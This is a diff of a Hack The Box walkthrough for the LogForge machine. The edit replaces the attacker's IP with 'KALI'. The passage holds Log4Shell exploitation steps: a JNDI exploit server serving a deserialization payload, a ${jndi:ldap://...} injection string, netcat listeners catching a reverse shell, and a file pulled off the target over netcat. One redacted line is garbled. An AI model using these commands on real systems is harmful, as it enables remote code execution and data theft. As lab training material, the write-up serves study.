@@ -132,7 +132,7 @@ I had to revert JNDI Exploit Kit version because the latest version broke and wo
 #### JNDI server to catch request and send payload
 
 /opt/log4Shell/JNDI-Exploit-Kit/target
-`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.2:1389 -P /root/htb/logforge/cc5.ser`
+`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L KALI:1389 -P /root/htb/logforge/cc5.ser`
 
 #### Set up listener
 
@@ -142,7 +142,7 @@ Then we can take a link provided from the JNDI Exploit it and pass it into the v
 
 ```
 ┌──(root💀kali)-[/opt/log4Shell/JNDI-Exploit-Kit/target]          
-└─# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.2:1389 -P /root/htb/logforge/cc5.ser                                                                                 
+└─# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L KALI:1389 -P /root/htb/logforge/cc5.ser                                                                                 
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                
        _ _   _ _____ _____      ______            _       _ _          _  ___ _                                                                                                                    | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |                                                                                                             
       | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
@@ -169,7 +169,7 @@ Then after putting it into the field I got a shell back
 ┌──(root💀kali)-[~]
 └─# nc -lvnp 9002                                                                         1 ⨯
 listening on [any] 9002 ...
-connect to [10.10.14.2] from (UNKNOWN) [10.10.11.138] 53210
+connect to [KALI] from (UNKNOWN) [10.10.11.138] 53210
 bash: cannot set terminal process group (827): Inappropriate ioctl for device
 bash: no job control in this shell
 tomcat@LogForge:/var/lib/tomcat9$ id
@@ -193,14 +193,14 @@ ftp localhost
 Connected to localhost.
 220 Welcome to the FTP-Server
 Name (localhost:tomcat): ${jndi:ldap://KALI:9002} 
-${jndi:ldap://10.10.14.2:9002} 
+${jndi:ldap://KALI:9002} 
 ```
 
 ```
 ┌──(root💀kali)-[/opt/log4Shell/ysoserial-modified/target]
 └─# nc -lvnp 9002           
 listening on [any] 9002 ...
-[Cconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.138] 53214
+[Cconnect to [KALI]om (UNKNOWN) [10.10.11.138] 53214
 0
  `
 ```
@@ -219,7 +219,7 @@ tomcat@LogForge:/$ nc KALI 9001 < ftpServer-1.0-SNAPSHOT-all.jar
 ┌──(root💀kali)-[~/htb/logforge]
 └─# nc -lvnp 9001 > ftpServer.jar                                                                                                                                                        1 ⨯
 listening on [any] 9001 ...
-connect to [10.10.14.2] from (UNKNOWN) [10.10.11.138] 40102
+connect to [KALI] from (UNKNOWN) [10.10.11.138] 40102
 ```
 
 Now I can use `jd-gui` to pick apart this code.
